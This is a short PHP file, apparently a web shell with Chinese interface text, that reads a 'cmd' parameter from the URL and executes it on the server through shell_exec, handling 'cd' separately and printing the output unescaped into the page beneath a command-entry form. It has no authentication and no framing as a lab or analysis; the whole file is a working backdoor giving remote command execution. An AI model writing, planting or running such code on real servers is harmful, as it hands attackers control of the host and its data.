php
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (strpos($cmd, 'cd ') === 0) {
        $dir = substr($cmd, 3);
        if (chdir($dir)) {
            echo "<p>切换目录成功</p><br>";
        } else {
            echo "<p>切换目录失败</p><br>"; 
        }
    } else {
        $output = shell_exec($cmd);
        echo "<p>$output</p><br>";
    }
}
?>

<form method="get">
<input type="text" name="cmd" placeholder="输入命令并回车">
<input type="submit" value="提交">
</form>
